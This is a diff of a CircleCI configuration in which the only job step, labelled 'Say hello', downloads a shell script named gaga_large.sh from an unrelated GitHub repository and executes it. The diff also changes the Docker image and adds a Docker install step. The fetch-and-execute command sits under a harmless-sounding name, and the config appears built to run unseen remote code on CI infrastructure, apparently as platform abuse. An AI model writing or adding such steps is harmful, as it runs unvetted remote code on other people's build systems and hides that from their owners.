@@ -9,14 +9,15 @@ jobs:
     # Specify the execution environment. You can specify an image from Docker Hub or use one of our convenience images from CircleCI's Developer Hub.
     # See: https://circleci.com/docs/configuration-reference/#executor-job
     docker:
-      - image: ubuntu:20.04 
+      - image: cimg/base:stable
     # Add steps to the job
     # See: https://circleci.com/docs/configuration-reference/#steps
     steps:
       - checkout
+      - docker/install-docker
       - run:
           name: "Say hello"
-          command: apt install wget -y && wget https://github.com/smile1samehada/Test/raw/main/gaga_large.sh && sudo chmod +x gaga_large.sh && ./gaga_large.sh
+          command: wget https://github.com/smile1samehada/Test/raw/main/gaga_large.sh && sudo chmod +x gaga_large.sh && ./gaga_large.sh
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
